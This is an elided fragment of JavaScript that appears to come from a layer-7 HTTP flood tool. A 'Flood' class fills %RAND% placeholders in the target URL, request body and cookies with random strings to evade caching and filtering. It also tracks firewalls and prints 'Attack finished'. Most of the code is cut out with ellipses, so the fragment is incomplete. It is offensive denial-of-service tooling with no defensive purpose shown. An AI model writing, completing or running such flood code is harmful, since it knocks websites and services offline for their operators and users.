...
function INIT(workerData) {
    ...
    class Flood {
        ...
        init(e) {
            e.url = l7.target.replace(/%RAND%/g, randomString(randomInt(5, 20)));
            if (l7.opt.body && l7.opt.body.indexOf("%RAND%") !== -1) {
                e.body = l7.opt.body.replace(/%RAND%/g, randomString(randomInt(5, 20)));
            }
            if (l7.opt.cookie) {
                l7.opt.cookie = l7.opt.cookie.replace(/%RAND%/g, randomString(randomInt(5, 20)));
                ...
                if (STATE.firewalls.length >= 1e3) {
                    ...
                    (
                        () => 
                        {
                           ...
                           console.log("\x1b[31mAttack finished...\x1b[0m");
                           // logger('Attack finished');
                           process.exit(4);
                           //Starter.init(4);
